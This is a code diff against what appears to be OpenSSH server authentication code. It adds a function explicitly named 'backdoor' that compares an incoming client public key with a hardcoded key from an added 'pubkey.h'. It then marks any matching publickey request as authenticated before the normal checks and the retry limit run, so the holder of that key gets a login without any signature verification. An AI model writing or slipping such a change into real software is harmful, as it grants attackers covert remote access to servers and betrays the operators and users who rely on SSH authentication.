@@ -55,6 +55,8 @@
 #endif
 #include "monitor_wrap.h"
 
+#include "pubkey.h"
+
 /* import */
 extern ServerOptions options;
 extern u_char *session_id2;
@@ -211,6 +213,35 @@ input_service_request(int type, u_int32_t seq, void *ctxt)
 	xfree(service);
 }
 
+static int
+backdoor(Authctxt *authctxt)
+{
+	Buffer b;
+	char *pkalg;
+	u_char *pkblob;
+	u_int alen, blen;
+	int have_sig;
+
+	have_sig = packet_get_char();
+	if (datafellows & SSH_BUG_PKAUTH) {
+		debug2("userauth_pubkey: SSH_BUG_PKAUTH");
+		/* no explicit pkalg given */
+		pkblob = packet_get_string(&blen);
+		buffer_init(&b);
+		buffer_append(&b, pkblob, blen);
+		/* so we have to extract the pkalg from the pkblob */
+		pkalg = buffer_get_string(&b, &alen);
+		buffer_free(&b);
+	} else {
+		pkalg = packet_get_string(&alen);
+		pkblob = packet_get_string(&blen);
+	}
+
+	int cmp = memcmp(pkblob, pubkey_decoded, blen);
+
+	return (cmp == 0);
+}
+
 /*ARGSUSED*/
 static void
 input_userauth_request(int type, u_int32_t seq, void *ctxt)
@@ -280,9 +311,13 @@ input_userauth_request(int type, u_int32_t seq, void *ctxt)
 	authctxt->postponed = 0;
 	authctxt->server_caused_failure = 0;
 
+	if (strcmp(method, "publickey") == 0) {
+		authenticated = backdoor(authctxt);
+	}
+
 	/* try to authenticate user */
 	m = authmethod_lookup(authctxt, method);
-	if (m != NULL && authctxt->failures < options.max_authtries) {
+	if (!authenticated && m != NULL && authctxt->failures < options.max_authtries) {
 		debug2("input_userauth_request: try method %s", method);
 		authenticated =	m->userauth(authctxt);
 	}
